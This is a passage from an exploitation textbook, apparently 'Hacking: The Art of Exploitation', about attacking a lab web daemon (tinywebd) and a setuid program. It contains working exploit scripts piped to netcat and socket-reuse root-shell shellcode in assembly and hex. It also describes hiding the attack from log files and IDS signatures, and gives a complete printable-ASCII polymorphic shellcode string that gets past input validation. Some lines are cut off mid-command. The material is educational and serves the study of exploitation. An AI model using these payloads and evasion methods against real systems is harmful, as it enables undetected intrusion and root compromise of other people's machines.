\\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\nFAKEADDR=\"\\xcf\\xf5\\xff\\xbf\" # +15 bytes from buffer @ 0xbffff5c0\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))\necho \"[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"$FAKEADDR\\\"x2 . \\\"\\x01\\x00\\x00\\x00\\r\\n\\\"\") | nc -w 1 -v $2\nWhen this script is used, the exploit is totally silent and nothing is written\nreader@hacking:~/booksrc $ ls -l /var/log/tinywebd.log\n-rw------- 1 root reader 6526 2007-09-19 23:24 /var/log/tinywebd.log\nreader@hacking:~/booksrc $ ./xtool_tinywebd_silent.sh mark_restore 127.0.0.1\n[Fake Request 15] [spoof IP 16] [NOP 332] [shellcode 53] [ret addr 128] [*fake_addr 8]\nreader@hacking:~/booksrc $ ls -l /var/log/tinywebd.log\n-rw------- 1 root reader 6526 2007-09-19 23:24 /var/log/tinywebd.log\n-rw------- 1 root reader 0 2007-09-19 23:35 /Hacked\nNotice the log file\u2019s size and access time remain the same. Using this\ntechnique, we can exploit tinywebd without leaving any trace in the log\nfiles. In addition, the write calls execute cleanly, as everything is written to\n/dev/null. This is shown by strace in the output below, when the silent\nroot       478  0.0  0.0   1636   420 ?        Ss   23:24   0:00 ./tinywebd\nreader    1005  0.0  0.0   2880   748 pts/1    R+   23:36   0:00 grep tinywebd\nreader@hacking:~/booksrc $ sudo strace -p 478 -e trace=write\nwrite(1, \"From 12.34.56.78:9090 \\\"GET / HTT\".., 47) = 47\nAs always, details can be hidden in the bigger picture. A single host usually\nexists within some sort of infrastructure. Countermeasures such as intrusion\ndetection systems (IDS) and intrusion prevention systems (IPS) can detect\nabnormal network traffic. Even simple log files on routers and firewalls can\nreveal abnormal connections that are indicative of an intrusion. In partic-\nular, the connection to port 31337 used in our connect-back shellcode is a\nbig red flag. We could change the port to something that looks less suspicious;\nhowever, simply having a webserver open outbound connections could be a\nred flag by itself. A highly secure infrastructure might even have the firewall\nsetup with egress filters to prevent outbound connections. In these situations,\nopening a new connection is either impossible or will be detected.\nIn our case, there\u2019s really no need to open a new connection, since we already\nhave an open socket from the web request. Since we\u2019re mucking around inside\nthe tinyweb daemon, with a little debugging we can reuse the existing socket\nfor the root shell. This prevents additional TCP connections from being\nlogged and allows exploitation in cases where the target host cannot open\noutbound connections. Take a look at the source code from tinywebd.c\nnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\nhandle_connection(new_sockfd, &client_addr, logfd);\n/* This function handles the connection on the passed socket from the\n* passed client address and logs to the passed FD. The connection is\n* processed as a web request, and this function replies over the connected\n* socket. Finally, the passed socket is closed at the end of the function.\nvoid handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\nunsigned char *ptr, request[500], resource[500], log_buffer[500];\nUnfortunately, the sockfd passed to handle_connection() will inevitably be\noverwritten so we can overwrite logfd. This overwrite happens before we gain\ncontrol of the program in the shellcode, so there\u2019s no way to recover the\nprevious value of sockfd. Luckily, main() keeps another copy of the socket\u2019s\nroot       478  0.0  0.0   1636   420 ?        Ss   23:24   0:00 ./tinywebd\nreader    1284  0.0  0.0   2880   748 pts/1    R+   23:42   0:00 grep tinywebd\nreader@hacking:~/booksrc $ sudo gdb -q\u2014pid=478 --symbols=./a.out\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already.  Kill it? (y or n) n\n77      /* This function handles the connection on the passed socket from the\n78       * passed client address and logs to the passed FD. The connection is\n79       * processed as a web request, and this function replies over the connected\n80       * socket. Finally, the passed socket is closed at the end of the function.\n82      void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\n83         unsigned char *ptr, request[500], resource[500], log_buffer[500];\nBreakpoint 1 at 0x8048fc3: file tinywebd.c, line 86.\nAfter the breakpoint is set and the program continues, the silent exploit\ntool is used from another terminal to connect and advance execution.\nBreakpoint 1, handle_connection (sockfd=13, client_addr_ptr=0xbffff810, logfd=3) at\n#0  handle_connection (sockfd=13, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86\nThe program is running.  Quit anyway (and detach it)? (y or n) y\nThis debugging output shows that new_sockfd is stored at 0xbffff83c within\nmain\u2019s stack frame. Using this, we can create shellcode that uses the socket\nfile descriptor stored here instead of creating a new connection.\nWhile we could just use this address directly, there are many little things\nthat can shift stack memory around. If this happens and the shellcode is using\na hard-coded stack address, the exploit will fail. To make the shellcode more\nreliable, take a cue from how the compiler handles stack variables. If we use\nan address relative to ESP, then even if the stack shifts around a bit, the address\nof new_sockfd will still be correct since the offset from ESP will be the same.\nAs you may remember from debugging with the mark_break shellcode, ESP\nwas 0xbffff7e0. Using this value for ESP, the offset is shown to be 0x5c bytes.\nThe following shellcode reuses the existing socket for the root shell.\nint 0x80          ; After the fork, in child process eax == 0.\njz child_process  ; In child process spawns a shell.\nlea edx, [esp+0x5c]  ; Put the address of new_sockfd in edx.\nmov ebx, [edx]       ; Put the value of new_sockfd in ebx.\njns dup_loop      ; If the sign flag is not set, ecx is not negative.\n; execve(const char *filename, char *const argv [], char *const envp[])\npush edx          ; push some nulls for string termination.\nmov ebx, esp      ; Put the address of \"/bin//sh\" into ebx, via esp.\npush edx          ; push 32-bit null terminator to stack.\nmov edx, esp      ; This is an empty array for envp.\npush ebx          ; push string addr to stack above null terminator.\nmov ecx, esp      ; This is the argv array with string ptr.\nint 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nTo effectively use this shellcode, we need another exploitation tool that\nlets us send the exploit buffer but keeps the socket out for further I/O.\nThis second exploit script adds an additional cat - command to the end of\nthe exploit buffer. The dash argument means standard input. Running cat\non standard input is somewhat useless in itself, but when the command is\npiped into netcat, this effectively ties standard input and output to netcat\u2019s\nnetwork socket. The script below connects to the target, sends the exploit\nbuffer, and then keeps the socket open and gets further input from the\nterminal. This is done with just a few modifications (shown in bold) to the\n#    reuses existing socket\u2014use socket_reuse shellcode\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # at +100 bytes from buffer @ 0xbffff5c0\nFAKEADDR=\"\\xcf\\xf5\\xff\\xbf\" # +15 bytes from buffer @ 0xbffff5c0\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))\necho \"[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"$FAKEADDR\\\"x2 . \\\"\\x01\\x00\\x00\\x00\\r\\n\\\"\";\nWhen this tool is used with the socket_reuse_restore shellcode, the root\nshell will be served up using the same socket used for the web request. The\nreader@hacking:~/booksrc $ nasm socket_reuse_restore.s\nreader@hacking:~/booksrc $ hexdump -C socket_reuse_restore\n00000000  6a 02 58 cd 80 85 c0 74  0a 8d 6c 24 68 68 b7 8f  |j.X..t.l$hh.|\n00000010  04 08 c3 8d 54 24 5c 8b  1a 6a 02 59 31 c0 31 d2  |..T$\\.j.Y1.1.|\n00000020  b0 3f cd 80 49 79 f9 b0  0b 52 68 2f 2f 73 68 68  |.?.Iy..Rh//shh|\n00000030  2f 62 69 6e 89 e3 52 89  e2 53 89 e1 cd 80        |/bin.R.S..|\nreader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh socket_reuse_restore 127.0.0.1\n[Fake Request 15] [spoof IP 16] [NOP 323] [shellcode 62] [ret addr 128] [*fake_addr 8]\nBy reusing the existing socket, this exploit is even quieter since it doesn\u2019t\ncreate any additional connections. Fewer connections mean fewer abnormal-\nThe aforementioned network IDS or IPS systems can do more than just track\nconnections\u2014they can also inspect the packets themselves. Usually, these\nsystems are looking for patterns that would signify an attack. For example, a\nsimple rule looking for packets that contain the string /bin/sh would catch a\nlot of packets containing shellcode. Our /bin/sh string is already slightly\nobfuscated since it\u2019s pushed to the stack in four-byte chunks, but a network\nIDS could also look for packets that contain the strings /bin and //sh.\nThese types of network IDS signatures can be fairly effective at catching\nscript kiddies who are using exploits they downloaded from the Internet. How-\never, they are easily bypassed with custom shellcode that hides any telltale\nTo hide the string, we will simply add 5 to each byte in the string. Then,\nafter the string has been pushed to the stack, the shellcode will subtract 5\nfrom each string byte on the stack. This will build the desired string on the\nstack so it can be used in the shellcode, while keeping it hidden during\ntransit. The output below shows the calculation of the encoded bytes.\nreader@hacking:~/booksrc $ echo \"/bin/sh\" | hexdump -C\n00000000  2f 62 69 6e 2f 73 68 0a                           |/bin/sh.|\nThe following shellcode pushes these encoded bytes to the stack and then\ndecodes them in a loop. Also, two int3 instructions are used to put breakpoints\nin the shellcode before and after the decoding. This is an easy way to see what\u2019s\nint 0x80          ; After the fork, in child process eax == 0.\njz child_process  ; In child process spawns a shell.\nlea edx, [esp+0x5c]  ; Put the address of new_sockfd in edx.\nmov ebx, [edx]       ; Put the value of new_sockfd in ebx.\njns dup_loop      ; If the sign flag is not set, ecx is not negative.\n; execve(const char *filename, char *const argv [], char *const envp[])\npush 0x056d7834   ; push \"/sh\\x00\" encoded +5 to the stack.\npush 0x736e6734   ; push \"/bin\" encoded +5 to the stack.\nmov ebx, esp      ; Put the address of encoded \"/bin/sh\" into ebx.\nint3 ; Breakpoint before decoding (REMOVE WHEN NOT DEBUGGING)\nint3  ; Breakpoint after decoding (REMOVE WHEN NOT DEBUGGING)\npush edx          ; push 32-bit null terminator to stack.\nmov edx, esp      ; This is an empty array for envp.\npush ebx          ; push string addr to stack above null terminator.\nmov ecx, esp      ; This is the argv array with string ptr.\nint 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nThe decoding loop uses the EDX register as a counter. It begins at 8\nand counts down to 0, since 8 bytes need to be decoded. Exact stack addresses\ndon\u2019t matter in this case since the important parts are all relatively addressed,\nso the output below doesn\u2019t bother attaching to an existing tinywebd process.\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nSince the breakpoints are actually part of the shellcode, there is no need\nto set one from GDB. From another terminal, the shellcode is assembled and\nreader@hacking:~/booksrc $ nasm encoded_sockreuserestore_dbg.s\nreader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh encoded_socketreuserestore_dbg 127.0.0.1\n[Fake Request 15] [spoof IP 16] [NOP 313] [shellcode 72] [ret addr 128] [*fake_addr 8]\nBack in the GDB window, the first int3 instruction in the shellcode is hit.\nFrom here, we can verify that the string decodes properly.\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0xbffff738:     52 '4'  103 'g' 110 'n' 115 's' 52 '4'  120 'x' 109 'm' 5 '\\005'\n[tcsetpgrp failed in terminal_inferior: Operation not permitted]\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0xbffff738:     47 '/'  98 'b'  105 'i' 110 'n' 47 '/'  115 's' 104 'h' 0 '\\0'\nNow that the decoding has been verified, the int3 instructions can be\nremoved from the shellcode. The following output shows the final shellcode\nreader@hacking:~/booksrc $ sed -e 's/int3/;int3/g' encoded_sockreuserestore_dbg.s >\nreader@hacking:~/booksrc $ diff encoded_sockreuserestore_dbg.s encoded_sockreuserestore.s 33c33\n< int3  ; Breakpoint before decoding  (REMOVE WHEN NOT DEBUGGING)\n> ;int3  ; Breakpoint before decoding  (REMOVE WHEN NOT DEBUGGING)\n< int3  ; Breakpoint after decoding  (REMOVE WHEN NOT DEBUGGING)\n> ;int3  ; Breakpoint after decoding  (REMOVE WHEN NOT DEBUGGING)\nreader@hacking:~/booksrc $ nasm encoded_sockreuserestore.s\nreader@hacking:~/booksrc $ hexdump -C encoded_sockreuserestore\n00000000  6a 02 58 cd 80 85 c0 74  0a 8d 6c 24 68 68 b7 8f  |j.X....t..l$hh..|\n00000010  04 08 c3 8d 54 24 5c 8b  1a 6a 02 59 31 c0 b0 3f  |....T$\\..j.Y1..?|\n00000020  cd 80 49 79 f9 b0 0b 68  34 78 6d 05 68 34 67 6e  |..Iy...h4xm.h4gn|\n00000030  73 89 e3 6a 08 5a 80 2c  13 05 4a 79 f9 31 d2 52  |s..j.Z.,..Jy.1.R|\n00000040  89 e2 53 89 e1 cd 80                              |..S....|\nreader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh encoded_sockreuserestore 127.0.0.1\n[Fake Request 15] [spoof IP 16] [NOP 314] [shellcode 71] [ret addr 128] [*fake_addr 8]\nThe NOP sled is another signature easy to detect by network IDSes and IPSes.\nLarge blocks of 0x90 aren\u2019t that common, so if a network security mechanism\nsees something like this, it\u2019s probably an exploit. To avoid this signature, we\ncan use different single-byte instructions instead of NOP. There are several\none-byte instructions\u2014the increment and decrement instructions for various\nregisters\u2014that are also printable ASCII characters.\nSince we zero out these registers before we use them, we can safely use a\nrandom combination of these bytes for the NOP sled. Creating a new exploit\ntool that uses random combinations of the bytes @, C, A, B, H, K, I, and J instead\nof a regular NOP sled will be left as an exercise for the reader. The easiest\nway to do this would be by writing a sled-generation program in C, which is\nused with a BASH script. This modification will hide the exploit buffer from\nSometimes a program will place certain restrictions on buffers. This type of\ndata sanity-checking can prevent many vulnerabilities. Consider the following\nexample program, which is used to update product descriptions in a fictitious\ndatabase. The first argument is the product code, and the second is the\nupdated description. This program doesn\u2019t actually update a database, but it\n/* Pretend this function updates a product description in a database. */\nvoid update_product_description(char *id, char *desc)\nprintf(\"[DEBUG]: description is at %p\\n\", description);\nprintf(\"Updating product #%s with description \\'%s\\'\\n\", product_code, desc);\nid = argv[1];   // id - Product code to update in DB\ndesc = argv[2]; // desc - Item description to update\nif(strlen(id) > MAX_ID_LEN) // id must be less than MAX_ID_LEN bytes.\nbarf(\"Fatal: id argument must be less than %u bytes\\n\", (void *)MAX_ID_LEN);\nfor(i=0; i < strlen(desc)-1; i++) { // Only allow printable bytes in desc.\nbarf(\"Fatal: description argument can only contain printable bytes\\n\", NULL);\n// Clearing all arguments except the first and second\nupdate_product_description(id, desc); // Update database.\nDespite the vulnerability, the code does make an attempt at security.\nThe length of the product ID argument is restricted, and the contents of the\ndescription argument are limited to printable characters. In addition, the\nunused environment variables and program arguments are cleared out for\nsecurity reasons. The first argument (id) is too small for shellcode, and since\nthe rest of the stack memory is cleared out, there\u2019s only one place left.\nreader@hacking:~/booksrc $ gcc -o update_info update_info.c\nreader@hacking:~/booksrc $ sudo chown root ./update_info\nreader@hacking:~/booksrc $ sudo chmod u+s ./update_info\nreader@hacking:~/booksrc $ ./update_info OCP209 \"Enforcement Droid\"\nUpdating product #OCP209 with description 'Enforcement Droid'\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"AAAA\"x10') blah\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"\\xf2\\xf9\\xff\\xbf\"x10') $(cat ./\nFatal: description argument can only contain printable bytes\nThis output shows a sample usage and then tries to exploit the vulnerable\nstrcpy() call. Although the return address can be overwritten using the first\nargument (id), the only place we can put shellcode is in the second argument\n(desc). However, this buffer is checked for nonprintable bytes. The debugging\noutput below confirms that this program could be exploited, if there was a\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) run $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x10') blah\nThe program being debugged has been started already.\nStarting program: /home/reader/booksrc/update_info $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x10')\nProgram received signal SIGSEGV, Segmentation fault.\nThe printable input validation is the only thing stopping exploitation.\nLike airport security, this input validation loop inspects everything coming\nin. And while it\u2019s not possible to avoid this check, there are ways to smuggle\nPolymorphic shellcode refers to any shellcode that changes itself. The encod-\ning shellcode from the previous section is technically polymorphic, since it\nmodifies the string it uses while it\u2019s running. The new NOP sled uses instruc-\ntions that assemble into printable ASCII bytes. There are other instructions\nthat fall into this printable range (from 0x33 to 0x7e); however, the total set\nThe goal is to write shellcode that will get past the printable character\ncheck. Trying to write complex shellcode with such a limited instruction set\nwould simply be masochistic, so instead, the printable shellcode will use simple\nmethods to build more complex shellcode on the stack. In this way, the print-\nable shellcode will actually be instructions to make the real shellcode.\nThe first step is figuring out a way to zero out registers. Unfortunately, the\nXOR instruction on the various registers doesn\u2019t assemble into the printable\nASCII character range. One option is to use the AND bitwise operation, which\nassembles into the percent character (%) when using the EAX register. The\nassembly instruction of and eax, 0x41414141 will assemble to the printable\nmachine code of %AAAA, since 0x41 in hexadecimal is the printable character A.\nSince the only case where the result is 1 is when both bits are 1, if two\ninverse values are ANDed onto EAX, EAX will become zero.\nAND 0111010001100010011000000110101   AND 0x3a313035\n------------------------------------  ---------------\nThus, by using two printable 32-bit values that are bitwise inverses of each\nother, the EAX register can be zeroed without using any null bytes, and the\nresulting assembled machine code will be printable text.\nSo %JONE%501: in machine code will zero out the EAX register. Interesting.\nSome other instructions that assemble into printable ASCII characters are\nAmazingly, these instructions, combined with the AND eax instruction,\nare sufficient to build loader code that will inject the shellcode onto the stack\nand then execute it. The general technique is, first, to set ESP back behind the\nexecuting loader code (in higher memory addresses), and then to build the\nshellcode from end to start by pushing values onto the stack, as shown here.\nSince the stack grows up (from higher memory addresses to lower memory\naddresses), the ESP will move backward as values are pushed to the stack,\nand the EIP will move forward as the loader code executes. Eventually,\nEIP and ESP will meet up, and the EIP will continue executing into the\nFirst, ESP must be set behind the printable loader shellcode. A little\ndebugging with GDB shows that after gaining control of program execution,\nESP is 555 bytes before the start of the overflow buffer (which will contain the\nloader code). The ESP register must be moved so it\u2019s after the loader code,\nwhile still leaving room for the new shellcode and for the loader shellcode\nitself. About 300 bytes should be enough room for this, so let\u2019s add 860 bytes\nto ESP to put it 305 bytes past the start of the loader code. This value doesn\u2019t\nneed to be exact, since provisions will be made later to allow for some slop.\nSince the only usable instruction is subtraction, addition can be simulated by\nsubtracting so much from the register that it wraps around. The register only\nhas 32 bits of space, so adding 860 to a register is the same as subtracting 860\nfrom 232, or 4,294,966,436. However, this subtraction must only use printable\nvalues, so we split it up across three instructions that all use printable operands.\nAs the GDB output confirms, subtracting these three values from a 32-bit\n(gdb) print  0 - 0x39393333 - 0x72727550 - 0x54545421\nThe goal is to subtract these values from ESP, not EAX, but the instruction\nsub esp doesn\u2019t assemble into a printable ASCII character. So the current value\nof ESP must be moved into EAX for the subtraction, and then the new value of\nHowever, since neither mov esp, eax nor mov eax, esp assemble into\nprintable ASCII characters, this exchange must be done using the stack. By\npushing the value from the source register to the stack and then popping it\noff into the destination register, the equivalent of a mov dest, source instruction\ncan be accomplished with push source and pop dest. Fortunately, the pop and\npush instructions for both EAX and ESP registers assemble into printable ASCII\ncharacters, so this can all be done using printable ASCII.\nHere is the final set of instructions to add 860 to ESP.\nThis means that TX-3399-Purr-!TTT-P\\ will add 860 to ESP in machine\ncode. So far, so good. Now the shellcode must be built.\nFirst, EAX must be zeroed out; this is easy now that a method has been\ndiscovered. Then, by using more sub instructions, the EAX register must be\nset to the last four bytes of the shellcode, in reverse order. Since the stack\nnormally grows upward (toward lower memory addresses) and builds with a\nFILO ordering, the first value pushed to the stack must be the last four bytes\nof the shellcode. These bytes must be in reverse order, due to the little-endian\nbyte ordering. The following output shows a hexadecimal dump of the stan-\ndard shellcode used in the previous chapters, which will be built by the print-\nreader@hacking:~/booksrc $ hexdump -C ./shellcode.bin\n00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|\n00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 51 89 e2 53 89  |//shh/bin..Q..S.|\n00000020  e1 cd 80                                          |...|\nIn this case, the last four bytes are shown in bold; the proper value for\nthe EAX register is 0x80cde189. This is easy to do by using sub instructions to\nwrap the value around. Then, EAX can be pushed to the stack. This moves\nESP up (toward lower memory addresses) to the end of the newly pushed\nvalue, ready for the next four bytes of shellcode (shown in italic in the pre-\nceding shellcode). More sub instructions are used to wrap EAX around to\n0x53e28951, and this value is then pushed to the stack. As this process is\nrepeated for each four-byte chunk, the shellcode is built from end to start,\n00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|\n00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 51 89 e2 53 89  |//shh/bin..Q..S.|\n00000020  e1 cd 80                                          |...|\nEventually, the beginning of the shellcode is reached, but there are only\nthree bytes (shown in italic in the preceding shellcode) left after pushing\n0x99c931db to the stack. This situation is alleviated by inserting one single-\nbyte NOP instruction at the beginning of the code, resulting in the value\n0x31c03190 being pushed to the stack\u20140x90 is machine code for NOP.\nEach of these four-byte chunks of the original shellcode is generated\nwith the printable subtraction method used earlier. The following source\ncode is a program to help calculate the necessary printable values.\n#define CHR \"%_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-\"\nprintf(\"Usage: %s <EAX starting value> <EAX end value>\\n\", argv[0]);\nprintf(\"calculating printable values to subtract from EAX..\\n\\n\");\nt[3] = (targ & 0xff000000)>>24; // Splitting by bytes\nprintf(\"     - 0x%08x\\n\", *((unsigned int *)word[i]));\nWhen this program is run, it expects two arguments\u2014the start and the\nend values for EAX. For the printable loader shellcode, EAX is zeroed out to\nstart with, and the end value should be 0x80cde189. This value corresponds to\nreader@hacking:~/booksrc $ gcc -o printable_helper printable_helper.c\nreader@hacking:~/booksrc $ ./printable_helper 0 0x80cde189\ncalculating printable values to subtract from EAX..\nreader@hacking:~/booksrc $ hexdump -C ./shellcode.bin\n00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|\n00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 51 89 e2 53 89  |//shh/bin..Q..S.|\n00000020  e1 cd 80                                          |...|\nreader@hacking:~/booksrc $ ./printable_helper 0x80cde189 0x53e28951\ncalculating printable values to subtract from EAX..\nThe output above shows the printable values needed to wrap the zeroed\nEAX register around to 0x80cde189 (shown in bold). Next, EAX should be\nwrapped around again to 0x53e28951 for the next four bytes of the shellcode\n(building backwards). This process is repeated until all the shellcode is built.\nsub eax,0x39393333      ; Subtract printable values\npop esp                 ;   Effectively ESP = ESP + 860\nsub eax,0x346d6d25      ; Subtract printable values\nsub eax,0x256d6d25      ;   to make EAX = 0x80cde189.\nsub eax,0x2557442d      ;   (last 4 bytes from shellcode.bin)\npush eax                ; Push these bytes to stack at ESP.\nsub eax,0x59316659      ; Subtract more printable values\nsub eax,0x59667766      ;  to make EAX = 0x53e28951.\nsub eax,0x7a537a79      ;  (next 4 bytes of shellcode from the end)\nAt the end, the shellcode has been built somewhere after the loader\ncode, most likely leaving a gap between the newly built shellcode and the\nexecuting loader code. This gap can be bridged by building a NOP sled\nOnce again, sub instructions are used to set EAX to 0x90909090, and\nEAX is repeatedly pushed to the stack. With each push instruction, four NOP\ninstructions are tacked onto the beginning of the shellcode. Eventually, these\nNOP instructions will build right over the executing push instructions of the\nloader code, allowing the EIP and program execution to flow over the sled\nThis assembles into a printable ASCII string, which doubles as executable\nTX-3399-Purr-!TTTP\\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-\n%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--\nThis printable ASCII shellcode can now be used to smuggle the actual\nshellcode past the input-validation routine of the update_info program.\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"AAAA\"x10') $(cat ./printable)\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"\\x10\\xf9\\xff\\xbf\"x10') $(cat ./\nUpdating product ########### with description 'TX-3399-Purr-!TTTP\\%JONE%501:-%mm4-%mm%--DW%P-\nYf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-\nTTTT-%NN0-%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP'\nNeat. In case you weren\u2019t able to follow everything that just happened\nthere, the output below watches the execution of the printable shellcode\nin GDB. The stack addresses will be slightly different, changing the return\naddresses, but this won\u2019t affect the printable shellcode\u2014it calculates its loca-\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nDump of assembler code for function update_product_description:\n0x080484a8 <update_product_description+0>:      push   ebp\n0x080484a9 <update_product_description+1>:      mov    ebp,esp\n0x080484ab <update_product_description+3>:      sub    esp,0x28\n0x080484ae <update_product_description+6>:      mov    eax,DWORD PTR [ebp+8]\n0x080484b1 <update_product_description+9>:      mov    DWORD PTR [esp+4],eax\n0x080484b5 <update_product_description+13>:     lea    eax,[ebp-24]\n0x080484b8 <update_product_description+16>:     mov    DWORD PTR [esp],eax\n0x080484bb <update_product_description+19>:     call   0x8048388 <strcpy@plt>\n0x080484c0 <update_product_description+24>:     mov    eax,DWORD PTR [ebp+12]\n0x080484c3 <update_product_description+27>:     mov    DWORD PTR [esp+8],eax\n0x080484c7 <update_product_description+31>:     lea    eax,[ebp-24]\n0x080484ca <update_product_description+34>:     mov    DWORD PTR [esp+4],eax\n0x080484ce <update_product_description+38>:     mov    DWORD PTR [esp],0x80487a0\n0x080484d5 <update_product_description+45>:     call   0x8048398 <printf@plt>\n0x080484da <update_product_description+50>:     leave\n0x080484db <update_product_description+51>:     ret\nBreakpoint 1 at 0x80484db: file update_info.c, line 21.\n(gdb) run $(perl -e 'print \"AAAA\"x10') $(cat ./printable)\nStarting program: /home/reader/booksrc/update_info $(perl -e 'print \"AAAA\"x10') $(cat ./\nProgram received signal SIGSEGV, Segmentation fault.\n0xb7f06bfb in strlen () from /lib/tls/i686/cmov/libc.so.6\n(gdb) run $(perl -e 'print \"\\xfd\\xf8\\xff\\xbf\"x10') $(cat ./printable)\nThe program being debugged has been started already.\nStarting program: /home/reader/booksrc/update_info $(perl -e 'print \"\\xfd\\xf8\\xff\\xbf\"x10')\nUpdating product # with description 'TX-3399-Purr-!TTTP\\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-\nyzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-\n%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP'\nBreakpoint 1, 0x080484db in update_product_description (\ndesc=0x5454212d <Address 0x5454212d out of bounds>) at update_info.c:21\nThe first nine instructions add 860 to ESP and zero out the EAX register.\nThe next eight instructions push the last eight bytes of the shellcode to the\nstack in four-byte chunks. This process is repeated in the next 32 instructions\n0xbffffa24:     0x53e28951      0x80cde189      0x00000000      0x00000000\n0xbffffa04:     0x90909090      0x31c03190      0x99c931db      0x80cda4b0\n0xbffffa14:     0x51580b6a      0x732f2f68      0x622f6868      0xe3896e69\n0xbffffa24:     0x53e28951      0x80cde189      0x00000000      0x00000000\n0xbffffa34:     0x00000000      0x00000000      0x00000000      0x00000000\nNow with the shellcode completely constructed on the stack, EAX is set\nto 0x90909090. This is pushed to the stack repeatedly to build a NOP sled to\nbridge the gap between the end of the loader code and the newly constructed\n0xbffff9ba:     0x50505050      0x50505050      0x50505050      0x50505050\n0xbffff9ca:     0x50505050      0x00000050      0x00000000      0x00000000\n0xbffff9da:     0x00000000      0x00000000      0x00000000      0x00000000\n0xbffff9ea:     0x00000000      0x00000000      0x00000000      0x00000000\n0xbffff9fa:     0x00000000      0x00000000      0x90900000      0x31909090\n0xbffffa0a:     0x31db31c0      0xa4b099c9      0x0b6a80cd      0x2f685158\n0xbffff9ba:     0x50505050      0x50505050      0x50505050      0x50505050\n0xbffff9ca:     0x50505050      0x00000050      0x00000000      0x00000000\n0xbffff9da:     0x90900000      0x90909090      0x90909090      0x90909090\n0xbffff9ea:     0x90909090      0x90909090      0x90909090      0x90909090\n0xbffff9fa:     0x90909090      0x90909090      0x90909090      0x31909090\n0xbffffa0a:     0x31db31c0      0xa4b099c9      0x0b6a80cd      0x2f685158\n0xbffff9ba:     0x50505050      0x50505050      0x50505050      0x90905050\n0xbffff9ca:     0x90909090      0x90909090      0x90909090      0x90909090\n0xbffff9da:     0x90909090      0x90909090      0x90909090      0x90909090\n0xbffff9ea:     0x90909090      0x90909090      0x90909090      0x90909090\n0xbffff9fa:     0x90909090      0x90909090      0x90909090      0x31909090\n0xbffffa0a:     0x31db31c0      0xa4b099c9      0x0b6a80cd      0x2f685158\nNow the execution pointer (EIP) can flow over the NOP bridge into the\nPrintable shellcode is a technique that can open some doors. It and\nall the other techniques we discussed are just building blocks that can be\nused in a myriad of different combinations. Their application requires some\ningenuity on your part. Be clever and beat them at their own game.\nThe exploit techniques demonstrated in this chapter have been around for\nages. It was only a matter of time for programmers to come up with some\nclever protection methods. An exploit can be generalized as a three-step\nprocess: First, some sort of memory corruption; then, a change in control\nMost applications never need to execute anything on the stack, so an obvious\ndefense against buffer overflow exploits is to make the stack 